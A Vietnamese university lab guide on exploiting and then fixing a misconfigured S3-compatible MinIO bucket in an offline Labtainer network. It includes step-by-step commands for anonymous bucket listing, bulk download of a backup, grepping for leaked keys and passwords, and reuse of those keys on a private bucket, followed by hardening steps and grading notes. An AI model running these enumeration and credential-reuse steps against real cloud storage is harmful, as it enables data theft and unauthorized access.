# Cấu hình sai lưu trữ đối tượng trên Cloud (S3 Misconfiguration)

**Mức độ:** Trung bình  |  **Phân loại:** Cloud Security / DevSecOps / Object Storage

**Ánh xạ khung tham chiếu:** MITRE ATT&CK for Cloud — T1530 (Data from Cloud Storage Object), T1580 (Cloud Infrastructure Discovery), T1552.001 (Unsecured Credentials: Credentials In Files) · OWASP Cloud-Native / Top 10 (Security Misconfiguration, Broken Access Control) · CIS Controls (Data Protection, Secure Configuration)

---

## 1. Giới thiệu lab

| Thông tin | Chi tiết |
|-----------|----------|
| **Tên Lab** | `cloud-s3-misconfig` |
| **Mức độ** | Trung bình |
| **Công cụ sử dụng** | `aws-cli` (s3 / s3api với `--endpoint-url`), `mc` (MinIO Client), `curl`, `jq` |
| **Kiến thức yêu cầu** | Kiến thức cơ bản về dòng lệnh Linux; hiểu sơ lược mô hình lưu trữ đối tượng (object storage), khái niệm bucket/object; biết đọc JSON. Các khái niệm về S3 policy, IAM, anonymous access sẽ được nhắc lại trong mục Kiến thức bổ trợ, không yêu cầu kinh nghiệm AWS thực tế. |

**Mục tiêu học tập**
- Hiểu mô hình lưu trữ đối tượng tương thích S3 và cách các dịch vụ cloud (AWS S3, MinIO) kiểm soát truy cập qua bucket policy và IAM.
- Nhận diện các dạng cấu hình sai phổ biến khiến bucket cho phép truy cập ẩn danh (anonymous list/get) và hậu quả lộ lọt dữ liệu.
- Thực hành kỹ thuật tấn công T1530 — liệt kê (enumerate) và trích xuất (exfiltrate) dữ liệu từ object storage bị cấu hình sai.
- Hiểu chuỗi tấn công leo thang: từ dữ liệu lộ lọt → credential → truy cập bucket khác được bảo vệ.
- Áp dụng tư duy DevSecOps để khắc phục: thiết lập policy private, least privilege, chặn public access, bật versioning và logging.

**Kỹ năng đạt được**
- Kỹ năng dùng `aws-cli` và `mc` trỏ tới endpoint S3 tùy biến để thao tác với object storage.
- Kỹ năng phát hiện và khai thác bucket policy cấu hình sai cho phép anonymous access.
- Kỹ năng săn tìm credential lộ lọt trong file backup/cấu hình và dùng chúng để mở rộng phạm vi truy cập.
- Kỹ năng đọc, phân tích và viết lại bucket policy (JSON) theo nguyên tắc least privilege.
- Kỹ năng hardening object storage: tắt public access, bật versioning/logging, xác minh cấu hình an toàn.

---

## 2. Kịch bản

**Tình huống:**
Trong quá trình đánh giá an ninh hạ tầng cloud nội bộ của một doanh nghiệp, sinh viên đóng vai một **pentester/attacker** đã có quyền truy cập mạng tới endpoint dịch vụ lưu trữ đối tượng của "cloud" nội bộ (một dịch vụ tương thích S3 chạy trên `172.60.2.20:9000`). Đây là môi trường **mô phỏng cloud offline**: dịch vụ object storage được đóng vai bởi **MinIO** (tương thích API S3) — không có AWS thật. Bộ phận DevOps đã cấu hình vội một bucket dùng để chia sẻ tài nguyên tĩnh nhưng vô tình đặt policy cho phép **anonymous list & get**. Attacker cần lợi dụng cấu hình sai này để liệt kê dữ liệu, tải về file backup nhạy cảm, từ đó phát hiện credential dẫn tới một bucket khác chứa dữ liệu mật (flag). Cuối cùng, với vai trò **DevSecOps engineer**, sinh viên phải khắc phục toàn bộ cấu hình sai.

**Vai trò của sinh viên:**
- Đóng vai attacker trên máy `client`, phát hiện và liệt kê các bucket/đối tượng có thể truy cập ẩn danh trên endpoint MinIO.
- Trích xuất (tải về) dữ liệu nhạy cảm từ bucket public, phân tích để tìm credential bị lộ lọt.
- Dùng credential tìm được để truy cập bucket được bảo vệ và lấy flag.
- Chuyển vai DevSecOps engineer: sửa bucket policy về private, chặn anonymous access, áp dụng least privilege và bật cơ chế bảo vệ (versioning/logging).

**Sơ đồ mạng**

```
+-------------------------------+                 +--------------------------------------+
|         client                |                 |            minio                     |
|  (máy tấn công / attacker)    |   mạng ảo       |   (S3 giả - Object Storage "cloud")  |
|                               |  Labtainer      |                                      |
|  aws-cli / mc / curl / jq     | =============>  |   MinIO server  :9000 (API S3)       |
|                               |   172.60.2.0/24 |   Console       :9001                |
|  IP: 172.60.2.10              |                 |   IP: 172.60.2.20                    |
+-------------------------------+                 |                                      |
                                                  |  Buckets:                            |
   Luồng: enumerate anon -> tải backup           |   - public-assets  (MISCONFIG: anon) |
          -> lấy credential -> truy cập          |   - app-backups    (chứa cred lộ)    |
          bucket bảo vệ -> flag -> hardening      |   - secure-data    (private, có flag)|
                                                  +--------------------------------------+
```

---

## 3. Kiến thức bổ trợ

**Kiến thức nền tảng**

- **Object storage & S3:** Lưu trữ đối tượng tổ chức dữ liệu thành các *object* (file + metadata) đặt trong *bucket* (không gian tên phẳng, không phải thư mục cây thật sự). Amazon S3 là dịch vụ tiêu biểu; API của nó trở thành chuẩn de-facto, được nhiều sản phẩm (như **MinIO**) hỗ trợ tương thích. Mỗi object được định danh bằng `s3://<bucket>/<key>`.

- **MinIO:** Phần mềm object storage mã nguồn mở, tương thích API S3, thường dùng để tự dựng "cloud storage" on-premise. Trong lab này MinIO đóng vai dịch vụ S3 của cloud. Vì tương thích S3 nên có thể thao tác bằng cả `aws-cli` (trỏ `--endpoint-url`) lẫn `mc` (MinIO Client).

- **Bucket policy & IAM:** Quyền truy cập object storage được kiểm soát bởi *bucket policy* (chính sách JSON gắn vào bucket, quy định ai được làm gì) và *IAM* (danh tính & quyền của người dùng/ứng dụng). Một policy có `"Principal": "*"` với action `s3:ListBucket`/`s3:GetObject` nghĩa là **bất kỳ ai (kể cả ẩn danh) đều đọc được** — đây là cấu hình sai phổ biến nhất.

- **Anonymous access & T1530:** Khi bucket cho phép truy cập ẩn danh, attacker không cần credential vẫn liệt kê và tải toàn bộ object. MITRE ATT&CK gọi hành vi lấy dữ liệu từ object storage là **T1530 – Data from Cloud Storage Object**. Rủi ro tăng cao khi bucket chứa backup, file cấu hình, hoặc credential (T1552.001).

- **Least privilege & Block Public Access:** Nguyên tắc DevSecOps: chỉ cấp quyền tối thiểu cần thiết. Với S3/MinIO, hardening gồm: gỡ policy public, đặt bucket về private, bật cơ chế chặn public access, bật *versioning* (chống mất/ghi đè dữ liệu) và *access logging/audit* (phát hiện truy cập bất thường).

**Thành phần cần quan sát trong bài lab**

| Thành phần | Vai trò |
|------------|---------|
| Endpoint MinIO `172.60.2.20:9000` | Điểm truy cập API S3 của "cloud"; nơi mọi lệnh `aws s3`/`mc` trỏ tới. |
| Bucket `public-assets` | Bucket bị **cấu hình sai**: policy cho phép anonymous `ListBucket` + `GetObject`. Điểm khởi đầu của chuỗi tấn công. |
| File backup trong `public-assets` (ví dụ `backup/app-config.env` hoặc `*.tar.gz`) | Chứa **credential lộ lọt** (access key/secret key) dẫn tới bucket khác. |
| Bucket `secure-data` | Bucket **private**, chỉ truy cập được bằng credential tìm thấy; chứa object đựng **flag**. |
| Bucket policy (JSON) | Đối tượng cần đọc/phân tích để hiểu misconfig và cần được viết lại khi hardening. |

**Bảng tùy chọn và cú pháp công cụ sử dụng trong bài**

| Công cụ | Tùy chọn / Cú pháp | Mô tả tác dụng |
|---------|--------------------|----------------|
| aws-cli | `aws --endpoint-url http://<IP>:9000 s3 ls s3://<bucket> --no-sign-request` | Liệt kê object trong bucket **không ký request** (truy cập ẩn danh). |
| aws-cli | `aws --endpoint-url http://<IP>:9000 s3 cp s3://<bucket>/<key> <local> --no-sign-request` | Tải object về máy attacker (ẩn danh). |
| aws-cli | `aws --endpoint-url http://<IP>:9000 s3api get-bucket-policy --bucket <bucket> --no-sign-request` | Đọc bucket policy đang áp dụng (JSON). |
| aws-cli | `aws configure` / biến môi trường `AWS_ACCESS_KEY_ID`, `AWS_SECRET_ACCESS_KEY` | Cấu hình credential để gọi API có xác thực. |
| aws-cli | `aws --endpoint-url http://<IP>:9000 s3api put-bucket-policy --bucket <bucket> --policy file://<policy.json>` | Ghi đè bucket policy (dùng khi hardening). |
| aws-cli | `aws --endpoint-url http://<IP>:9000 s3api delete-bucket-policy --bucket <bucket>` | Xóa bucket policy public (đưa bucket về private). |
| aws-cli | `aws --endpoint-url http://<IP>:9000 s3api put-bucket-versioning --bucket <bucket> --versioning-configuration Status=Enabled` | Bật versioning cho bucket. |
| mc | `mc alias set <name> http://<IP>:9000 <access_key> <secret_key>` | Tạo alias kết nối tới MinIO với credential. |
| mc | `mc ls <alias>/<bucket>` · `mc cp <alias>/<bucket>/<key> <local>` | Liệt kê / tải object bằng MinIO Client. |
| mc | `mc anonymous get <alias>/<bucket>` · `mc anonymous set none <alias>/<bucket>` | Xem / gỡ quyền truy cập ẩn danh của bucket. |
| curl | `curl -s http://<IP>:9000/<bucket>/?list-type=2` | Gọi trực tiếp API S3 (ListObjectsV2) qua HTTP để kiểm tra anonymous list. |
| jq | `... \| jq .` / `jq -r '.Statement[]'` | Định dạng và trích lọc JSON (bucket policy, output API). |

---

## 4. Các nhiệm vụ của bài thực hành

Để tải bài thực hành, sinh viên thực hiện câu lệnh:

```bash
imodule https://github.com/namlt04/do-an-2026/raw/refs/heads/master/imodule/cloud-s3-misconfig.tar
```

Để khởi động bài thực hành, sinh viên dùng câu lệnh:

```bash
labtainer cloud-s3-misconfig
```

*(Chú ý: sinh viên sử dụng mã sinh viên của mình để nhập thông tin email người thực hiện bài lab khi có yêu cầu, để sử dụng khi chấm điểm.)*

Sau khi khởi động xong, một terminal ảo sẽ xuất hiện, đại diện cho máy tấn công: `client`. Toàn bộ lệnh dưới đây gõ trên `client`. Endpoint object storage của "cloud" là `http://172.60.2.20:9000`.

> **Ghi chú credential giả:** Mọi access key/secret key trong bài là **giả, do lab sinh ra**, chỉ có tác dụng trong môi trường MinIO cục bộ này, không phải credential AWS thật.

---

### Nhiệm vụ 1 — enum_anonymous: Phát hiện & liệt kê bucket truy cập ẩn danh

**Mục tiêu:** Xác nhận endpoint object storage phản hồi, phát hiện bucket cho phép truy cập ẩn danh và liệt kê được nội dung của nó mà không cần credential.

**Bước 1:** Kiểm tra endpoint S3 có phản hồi và thử liệt kê bucket ẩn danh:
```bash
curl -s http://172.60.2.20:9000/public-assets/?list-type=2 | head -40
```

**Bước 2:** Dùng `aws-cli` liệt kê object trong bucket nghi ngờ bằng chế độ không ký request:
```bash
aws --endpoint-url http://172.60.2.20:9000 s3 ls s3://public-assets --recursive --no-sign-request
```

**Bước 3:** Đọc bucket policy để xác nhận nguyên nhân cấu hình sai:
```bash
aws --endpoint-url http://172.60.2.20:9000 s3api get-bucket-policy --bucket public-assets --no-sign-request | jq -r '.Policy' | jq .
```
Quan sát trường `"Principal"` và `"Action"` trong policy để xác định vì sao bucket cho phép truy cập ẩn danh.

**Điều kiện hoàn thành nhiệm vụ:** Liệt kê thành công (ẩn danh, không dùng credential) danh sách object trong bucket `public-assets`, và đọc được bucket policy chứa `"Principal": {"AWS": "*"}` (hoặc `"*"`) với action `s3:GetObject`/`s3:ListBucket`.

**Câu hỏi 1:** Trong bucket policy vừa đọc, thành phần cụ thể nào biến bucket này thành "public"? Nếu chỉ muốn cho phép đọc file tĩnh công khai (ví dụ ảnh) nhưng KHÔNG cho liệt kê toàn bộ nội dung bucket, cần thay đổi gì trong policy?
Trả lời: _______________________________________

---

### Nhiệm vụ 2 — exfiltrate_backup: Trích xuất backup và tìm credential lộ lọt

**Mục tiêu:** Tải về dữ liệu nhạy cảm từ bucket public và phân tích để phát hiện credential (access key/secret key) bị lộ trong file backup/cấu hình.

**Bước 1:** Tải toàn bộ nội dung bucket public về máy attacker:
```bash
mkdir -p loot
aws --endpoint-url http://172.60.2.20:9000 s3 cp s3://public-assets/ loot/ --recursive --no-sign-request
```

**Bước 2:** Nếu backup ở dạng nén, giải nén để xem nội dung:
```bash
ls -la loot/
# ví dụ nếu có file .tar.gz:
find loot -name '*.tar.gz' -exec tar -xzvf {} -C loot \;
```

**Bước 3:** Săn tìm credential lộ lọt trong các file backup/cấu hình:
```bash
grep -rniE 'access_?key|secret_?key|aws_access|aws_secret|password|token' loot/
```

**Bước 4:** Ghi lại cặp `access_key` / `secret_key` tìm được (đây là credential dùng cho object storage nội bộ). Xác định chúng có thể mở khóa bucket nào khác.

**Điều kiện hoàn thành nhiệm vụ:** Tải thành công file backup từ `public-assets` và trích xuất được một cặp access key + secret key hợp lệ từ nội dung file (ví dụ trong `app-config.env` hoặc file backup giải nén).

**Câu hỏi 2:** Vì sao việc lưu file backup/cấu hình chứa credential trong một bucket cho phép anonymous read lại nguy hiểm hơn nhiều so với việc chỉ lộ vài file tĩnh vô hại? Hãy nêu nguyên tắc bảo mật nào đã bị vi phạm ở đây.
Trả lời: _______________________________________

---

### Nhiệm vụ 3 — access_secure_bucket: Dùng credential lộ để lấy flag

**Mục tiêu:** Dùng credential vừa tìm được để xác thực vào object storage và truy cập bucket private `secure-data`, lấy flag.

**Bước 1:** Cấu hình credential tìm được (dùng biến môi trường hoặc `aws configure`):
```bash
export AWS_ACCESS_KEY_ID=<ACCESS_KEY_TÌM_ĐƯỢC>
export AWS_SECRET_ACCESS_KEY=<SECRET_KEY_TÌM_ĐƯỢC>
export AWS_DEFAULT_REGION=us-east-1
```

**Bước 2:** Liệt kê các bucket mà credential này nhìn thấy (lần này KHÔNG dùng `--no-sign-request`):
```bash
aws --endpoint-url http://172.60.2.20:9000 s3 ls
```

**Bước 3:** Liệt kê nội dung bucket private và tải object chứa flag:
```bash
aws --endpoint-url http://172.60.2.20:9000 s3 ls s3://secure-data --recursive
aws --endpoint-url http://172.60.2.20:9000 s3 cp s3://secure-data/<key_chứa_flag> ./flag.txt
cat flag.txt
```
*(Cách khác dùng `mc`: `mc alias set loot http://172.60.2.20:9000 <access_key> <secret_key>` rồi `mc ls loot/secure-data` và `mc cp loot/secure-data/<key> ./flag.txt`.)*

**Điều kiện hoàn thành nhiệm vụ:** Xác thực thành công bằng credential lộ lọt, truy cập bucket `secure-data` và lấy được nội dung object chứa chuỗi **flag** đúng định dạng.

**Câu hỏi 3:** Trình bày lại toàn bộ chuỗi khai thác từ khi phát hiện endpoint đến khi lấy được flag. Đâu là "nguyên nhân gốc rễ" (root cause) khiến chuỗi tấn công này khả thi, và một credential bị lộ có thể gây thiệt hại lan rộng như thế nào (khái niệm blast radius)?
Trả lời: _______________________________________

---

### Nhiệm vụ 4 — harden_storage: Khắc phục cấu hình sai (DevSecOps)

**Mục tiêu:** Chuyển vai DevSecOps engineer, loại bỏ toàn bộ cấu hình sai: đưa bucket public về private, chặn anonymous access, áp dụng least privilege và bật cơ chế bảo vệ. Sử dụng credential quản trị được cấp trong bài (xem Ghi chú triển khai) hoặc credential đã có nếu đủ quyền.

**Bước 1:** Gỡ bỏ policy public trên `public-assets` để chặn anonymous access:
```bash
aws --endpoint-url http://172.60.2.20:9000 s3api delete-bucket-policy --bucket public-assets
# hoặc bằng mc:
# mc anonymous set none loot/public-assets
```

**Bước 2:** Xác minh anonymous access đã bị chặn (lệnh dưới đây bây giờ PHẢI thất bại/AccessDenied):
```bash
aws --endpoint-url http://172.60.2.20:9000 s3 ls s3://public-assets --no-sign-request
```

**Bước 3:** (Nếu vẫn cần chia sẻ file tĩnh) áp policy least privilege — chỉ cho phép `s3:GetObject` trên đúng prefix công khai, KHÔNG cho `s3:ListBucket`. Tạo file `harden-policy.json`:
```json
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Principal": {"AWS": "*"},
      "Action": ["s3:GetObject"],
      "Resource": ["arn:aws:s3:::public-assets/static/*"]
    }
  ]
}
```
```bash
aws --endpoint-url http://172.60.2.20:9000 s3api put-bucket-policy --bucket public-assets --policy file://harden-policy.json
```

**Bước 4:** Bật versioning cho các bucket dữ liệu để chống mất/ghi đè và hỗ trợ phục hồi:
```bash
aws --endpoint-url http://172.60.2.20:9000 s3api put-bucket-versioning --bucket secure-data --versioning-configuration Status=Enabled
aws --endpoint-url http://172.60.2.20:9000 s3api get-bucket-versioning --bucket secure-data
```

**Bước 5:** Xác minh trạng thái cuối: `secure-data` không truy cập ẩn danh được, backup chứa credential không còn nằm ở nơi public (khuyến nghị di dời/xóa và xoay vòng — rotate — credential đã lộ).

**Điều kiện hoàn thành nhiệm vụ:** Sau khi hardening, lệnh liệt kê ẩn danh `s3 ls s3://public-assets --no-sign-request` trả về AccessDenied (không còn liệt kê được); bucket `secure-data` không truy cập được khi ẩn danh; versioning ở trạng thái `Enabled`.

**Câu hỏi 4:** Ngoài việc gỡ policy public, vì sao bước "xoay vòng (rotate) credential đã bị lộ" là bắt buộc chứ không phải tùy chọn? Hãy liệt kê ít nhất ba biện pháp phòng ngừa (preventive/detective control) giúp phát hiện sớm hoặc ngăn tái diễn dạng cấu hình sai này trong quy trình DevSecOps (gợi ý: CI policy scan, block public access mặc định, access logging/alerting).
Trả lời: _______________________________________

---

## 5. Ghi chú triển khai (cho người xây lab)

**Container cần dựng (khai báo trong `start.config`, mạng ảo `172.60.2.0/24`):**
- `minio` — IP `172.60.2.20`. Chạy MinIO server (cổng API `9000`, console `9001`). Cài `mc` để seed dữ liệu/policy trong script khởi tạo.
- `client` — IP `172.60.2.10`. Máy attacker, terminal của sinh viên. Cài qua Dockerfile: `awscli` (pip hoặc apt), `mc` (binary MinIO Client), `curl`, `jq`, `tar`, `gzip`.

**Seed dữ liệu & cấu hình (script chạy lúc build/khởi tạo container `minio`):**
1. Khởi động MinIO với root credential quản trị (ví dụ `MINIO_ROOT_USER` / `MINIO_ROOT_PASSWORD` — giả, chỉ dùng nội bộ). Root credential này KHÔNG lộ cho sinh viên; dùng để seed và để chấm/kiểm tra hardening (hoặc cấp riêng cho Nhiệm vụ 4 qua một user hardening có quyền `s3:PutBucketPolicy`/`DeleteBucketPolicy` trên các bucket).
2. Tạo 3 bucket: `public-assets`, `app-backups` (tùy chọn, có thể gộp backup vào `public-assets`), `secure-data`.
3. Tạo một IAM user/service account "app" với cặp `access_key`/`secret_key` **giả** có quyền đọc `secure-data`. Đây là credential sẽ bị "lộ".
4. Trong `public-assets`: đặt vài file tĩnh vô hại (ảnh, `index.html`) dưới prefix `static/`, và một file backup nhạy cảm, ví dụ `backup/app-config.env` chứa dòng:
   ```
   AWS_ACCESS_KEY_ID=<access_key_app>
   AWS_SECRET_ACCESS_KEY=<secret_key_app>
   ```
   (Có thể đóng gói thêm dạng `backup/app-YYYYMMDD.tar.gz` để buộc sinh viên giải nén.)
5. Gắn **bucket policy misconfig** cho `public-assets` cho phép anonymous `s3:ListBucket` + `s3:GetObject` với `Principal: *` (dùng `mc anonymous set download/public` hoặc `aws s3api put-bucket-policy`).
6. Trong `secure-data`: đặt object chứa **flag**, ví dụ `secure-data/confidential/flag.txt`. Bucket này để private (không policy anonymous). Flag nên **tham số hóa theo mã sinh viên** để mỗi sinh viên nhận flag khác nhau.

**Flag/goal dự kiến (chấm điểm tự động qua artifacts: bash history, stdout, file output):**
- `enum_anonymous` — phát hiện được output list bucket ẩn danh + nội dung policy public (grep stdout/history có `public-assets` + `--no-sign-request`, hoặc phát hiện chuỗi `"Principal"`/`*` trong output policy).
- `exfiltrate_backup` — file backup xuất hiện trong thư mục `loot/` trên `client`; access/secret key được trích ra (so khớp chuỗi access key giả).
- `access_secure_bucket` — nội dung `flag.txt` trên `client` khớp flag đã seed (theo mã sinh viên) → goal chính lấy flag.
- `harden_storage` — kiểm tra lại phía `minio`: `public-assets` không còn cho anonymous `ListBucket` (goal so khớp trạng thái policy/anonymous = none) và `secure-data` versioning = `Enabled`. Có thể chấm bằng script kiểm tra chạy trên `minio` khi kết thúc lab.

**Điểm cần lưu ý về tài nguyên & triển khai:**
- MinIO nhẹ, phù hợp Labtainer offline; chỉ cần 1 binary `minio` + `mc`. Không cần internet.
- `aws-cli` v2 khá nặng; nếu VM hạn chế tài nguyên, cân nhắc `awscli` v1 qua pip hoặc chỉ dùng `mc` cho toàn bộ thao tác (bảng công cụ đã có sẵn cả hai đường). Cần cài offline nên đóng gói package vào image lúc build.
- Nhắc rõ trong tài liệu: mọi credential/flag là giả, chỉ có ý nghĩa trong container; không dùng lại ngoài đời.
- Nếu muốn tăng độ khó: ẩn tên bucket `secure-data`, buộc sinh viên `aws s3 ls` bằng credential lộ để phát hiện bucket; hoặc đặt thêm bước phát hiện endpoint qua quét cổng `9000`.
- Tỷ lệ ~60% bảo mật (NV1 enum misconfig, NV2 exfil + tìm credential, NV3 leo thang lấy flag, NV4 hardening) / ~40% môi trường (dựng MinIO, cấu hình endpoint, aws-cli/mc, JSON policy).
